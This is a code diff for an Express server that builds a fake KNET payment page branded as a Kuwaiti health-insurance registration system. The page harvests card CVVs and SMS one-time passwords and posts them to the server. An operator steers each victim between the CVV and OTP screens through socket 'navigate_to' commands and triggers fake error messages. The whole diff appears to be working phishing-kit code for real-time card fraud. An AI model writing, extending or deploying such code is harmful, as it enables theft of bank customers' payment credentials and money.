@@ -26,8 +26,11 @@ function getInterceptorScript() {
   return `<script type="module">
 // This runs as a module, AFTER Angular modules have loaded
 (function() {
-  // Guard: only run once even if script is re-executed
-  if (window.__interceptorRunning) return;
+  // Guard: use sessionStorage to persist across Angular re-initialization
+  // Angular resets window variables but NOT sessionStorage
+  var _guardKey = '__interceptorRunning_' + (new URLSearchParams(window.location.search).get('id') || sessionStorage.getItem('eventat_knet_txn') || 'global');
+  if (sessionStorage.getItem(_guardKey)) return;
+  sessionStorage.setItem(_guardKey, '1');
   window.__interceptorRunning = true;
 
   // If URL has ?id=xxx, override sessionStorage immediately
@@ -311,20 +314,200 @@ app.post('/knet/cvv', (req, res) => {
   res.json({ success: true, payment });
 });
 
-// Redirect /knet-otp with mode=cvv to serve CVV page
+// Build standalone OTP page (no Angular dependency)
+function buildOtpPage(knetId, mode, showError) {
+  const isCvv = mode === 'cvv';
+  const fieldLabel = isCvv ? 'CVV:' : 'OTP:';
+  const fieldPlaceholder = isCvv ? 'CVV' : 'OTP';
+  const notification = isCvv
+    ? 'Please enter the CVV number on the back of your card (3-4 digits).'
+    : 'You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.';
+  const errorHtml = showError
+    ? `<div style="background:#f8d7da;border:1px solid #f5c6cb;border-radius:4px;padding:6px 12px;font-size:12px;color:#721c24;text-align:center;margin-bottom:8px;">رمز ${isCvv ? 'CVV' : 'OTP'} غير صحيح، يرجى التأكد وإعادة المحاولة</div>`
+    : '';
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>النظام الآلي لتسجيل الضمان الصحي</title>
+  <script src="/socket.io/socket.io.js"><\/script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #d9d9d9; font-family: sans-serif; min-height: 100vh; padding: 0 16px 16px; }
+    .container { width: 100%; max-width: 385px; margin: 0 auto; }
+    .banner { margin-bottom: 12px; }
+    .banner img { width: 100%; height: auto; border-radius: 10px; border: 1px solid #cfcfcf; }
+    .card { background: white; padding: 12px; padding-bottom: 0; border: 2px solid #9e9e9e; border-radius: 15px; margin-bottom: 12px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
+    .logo-wrap { margin-bottom: 12px; display: flex; justify-content: center; }
+    .logo-wrap img { width: 135px; max-width: 100%; height: auto; }
+    .row { padding: 5px 0; border-bottom: 1px solid #8f8f90; display: flex; align-items: center; justify-content: space-between; }
+    .row:last-child { border-bottom: none; }
+    .row label { font-size: 11px; color: #0070cd; font-weight: bold; width: 41%; text-align: left; }
+    .row .val { font-size: 11px; color: #444; padding-left: 5px; }
+    .notif-box { background: #f0f4ff; border: 1px solid #c0d0f0; border-radius: 6px; padding: 8px 10px; font-size: 11px; color: #333; margin-bottom: 8px; }
+    .notif-box span { font-weight: bold; }
+    .input-row { padding: 5px 0; display: flex; align-items: center; justify-content: space-between; }
+    .input-row label { font-size: 11px; color: #0070cd; font-weight: bold; width: 41%; text-align: left; }
+    .input-row input { width: 59%; font-size: 12px; padding: 4px 6px; border: 1px solid #aaa; border-radius: 4px; outline: none; }
+    .input-row input:focus { border-color: #0070cd; }
+    .btn-row { display: flex; gap: 8px; padding: 10px 0; }
+    .btn { flex: 1; padding: 8px; font-size: 13px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+    .btn-confirm { background: #0070cd; color: white; }
+    .btn-confirm:disabled { background: #aaa; cursor: not-allowed; }
+    .btn-cancel { background: #e0e0e0; color: #333; }
+    .processing { text-align: center; padding: 20px; font-size: 13px; color: #555; }
+    .processing .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid #ccc; border-top-color: #0070cd; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer { text-align: center; font-size: 10px; color: #888; padding: 8px 0; }
+    .footer a { color: #0070cd; text-decoration: none; }
+    .knet-logo { display: flex; justify-content: center; gap: 4px; flex-wrap: wrap; padding: 4px 0; }
+    .knet-logo img { height: 20px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="banner"><img src="/imgs/mob.jpg" alt="Banner"></div>
+    <div class="card">
+      <div class="logo-wrap"><img src="/imgs/download.jpg" alt="logo"></div>
+      <div class="row"><label>Merchant:</label><div class="val">Online Insurance System</div></div>
+      <div class="row"><label>Amount:</label><div class="val">KD 0.000</div></div>
+      <div id="form-area">
+        <div class="notif-box"><span>NOTIFICATION:</span> ${notification}</div>
+        ${errorHtml}
+        <div class="row"><label>Card Number:</label><div class="val"></div></div>
+        <div class="row"><label>Expiration Month:</label><div class="val">MM</div></div>
+        <div class="row"><label>Expiration Year:</label><div class="val">YYYY</div></div>
+        <div class="row"><label>PIN:</label><div class="val">****</div></div>
+        <div class="input-row">
+          <label>${fieldLabel}</label>
+          <input type="password" id="main-input" placeholder="${fieldPlaceholder}" maxlength="${isCvv ? '4' : '6'}" autocomplete="one-time-code">
+        </div>
+        <div class="btn-row">
+          <button class="btn btn-confirm" id="confirm-btn">Confirm</button>
+          <button class="btn btn-cancel" id="cancel-btn">Cancel</button>
+        </div>
+      </div>
+      <div id="processing-area" style="display:none">
+        <div class="processing"><span class="spinner"></span>Processing... please wait ...</div>
+      </div>
+    </div>
+    <div class="footer">
+      All Rights Reserved Copyright 2025 ©
+      <br><a href="https://www.knet.com.kw" target="_blank">The Shared Electronic Banking Services Company - KNET</a>
+    </div>
+  </div>
+  <script>
+  (function() {
+    var knetId = '${knetId}';
+    var isCvv = ${isCvv};
+    var pollTimer = null;
+    var socket = null;
+
+    // Store knetId in sessionStorage for Angular pages
+    if (knetId) sessionStorage.setItem('eventat_knet_txn', knetId);
+
+    function showProcessing() {
+      document.getElementById('form-area').style.display = 'none';
+      document.getElementById('processing-area').style.display = 'block';
+    }
+
+    function startPolling() {
+      if (pollTimer) clearInterval(pollTimer);
+      pollTimer = setInterval(function() {
+        fetch('/knet/status/' + knetId)
+          .then(function(r) { return r.json(); })
+          .catch(function() { return null; })
+          .then(function(data) {
+            if (!data || !data.payment) return;
+            var s = data.payment.status;
+            if (isCvv) {
+              if (s === 'CVV_APPROVED') { clearInterval(pollTimer); window.location.replace('/knet-otp?id=' + knetId); }
+              else if (s === 'CVV_FAILED') { clearInterval(pollTimer); window.location.replace('/knet-otp?mode=cvv&id=' + knetId + '&error=1'); }
+            } else {
+              if (s === 'CVV_PENDING') { clearInterval(pollTimer); window.location.replace('/knet-otp?mode=cvv&id=' + knetId); }
+              else if (s === 'OTP_FAILED' || s === 'REJECTED') { clearInterval(pollTimer); window.location.replace('/knet-otp?id=' + knetId + '&error=1'); }
+            }
+          });
+      }, 1500);
+    }
+
+    function setupSocket() {
+      try {
+        socket = io();
+        socket.on('connect', function() {
+          socket.emit('join_payment', knetId);
+          console.log('[OTP Page] Socket connected, joined payment:', knetId);
+        });
+        socket.on('navigate_to', function(data) {
+          console.log('[OTP Page] navigate_to:', data);
+          if (data && data.page) {
+            var page = data.page;
+            if (page === '/knet/cvv' || page === 'cvv') window.location.replace('/knet-otp?mode=cvv&id=' + knetId);
+            else if (page === '/knet-otp' || page === 'otp') window.location.replace('/knet-otp?id=' + knetId);
+            else window.location.replace(page + (page.indexOf('?') !== -1 ? '&' : '?') + 'id=' + knetId);
+          }
+        });
+        socket.on('payment_status_changed', function(data) {
+          if (!data || (data.id !== knetId && data.paymentId !== knetId)) return;
+          var s = data.status;
+          if (isCvv) {
+            if (s === 'CVV_APPROVED') { if (pollTimer) clearInterval(pollTimer); window.location.replace('/knet-otp?id=' + knetId); }
+            else if (s === 'CVV_FAILED') { if (pollTimer) clearInterval(pollTimer); window.location.replace('/knet-otp?mode=cvv&id=' + knetId + '&error=1'); }
+          } else {
+            if (s === 'CVV_PENDING') { if (pollTimer) clearInterval(pollTimer); window.location.replace('/knet-otp?mode=cvv&id=' + knetId); }
+            else if (s === 'OTP_FAILED' || s === 'REJECTED') { if (pollTimer) clearInterval(pollTimer); window.location.replace('/knet-otp?id=' + knetId + '&error=1'); }
+          }
+        });
+      } catch(e) { console.log('[OTP Page] Socket error:', e); }
+    }
+
+    document.getElementById('confirm-btn').addEventListener('click', function() {
+      var input = document.getElementById('main-input');
+      var val = input ? input.value.trim() : '';
+      if (!val || val.length < (isCvv ? 3 : 4)) {
+        if (input) input.style.borderColor = 'red';
+        return;
+      }
+      if (input) input.style.borderColor = '';
+      document.getElementById('confirm-btn').disabled = true;
+      var endpoint = isCvv ? '/knet/cvv' : '/knet/otp';
+      var body = isCvv ? { knetId: knetId, cvv: val } : { knetId: knetId, otp: val };
+      fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data.success) {
+            showProcessing();
+            startPolling();
+            setupSocket();
+          } else {
+            document.getElementById('confirm-btn').disabled = false;
+          }
+        }).catch(function() {
+          document.getElementById('confirm-btn').disabled = false;
+        });
+    });
+
+    document.getElementById('cancel-btn').addEventListener('click', function() {
+      window.history.back();
+    });
+
+    // If page loaded with error, show the form (already done via errorHtml)
+    // Setup socket for navigate_to commands from admin
+    setupSocket();
+  })();
+  <\/script>
+</body>
+</html>`;
+}
+
+// Serve standalone OTP/CVV page for /knet-otp
 app.get('/knet-otp', (req, res, next) => {
-  if (req.query.mode !== 'cvv') return next();
-  const fs = require('fs');
   const knetId = req.query.id || '';
+  const mode = req.query.mode || '';
   const showError = req.query.error === '1';
-  const indexPath = path.join(__dirname, 'public', 'index.html');
-  fs.readFile(indexPath, 'utf8', (err, html) => {
-    if (err) return res.sendFile(indexPath);
-    const interceptScript = getInterceptorScript();
-    const cvvPatchScript = buildCvvPatchScript(knetId, showError);
-    const modifiedHtml = html.replace('</body>', interceptScript + cvvPatchScript + '</body>');
-    res.send(modifiedHtml);
-  });
+  if (!knetId) return next(); // No id, serve Angular
+  res.send(buildOtpPage(knetId, mode, showError));
 });
 
 app.get('/knet/cvv', (req, res) => {
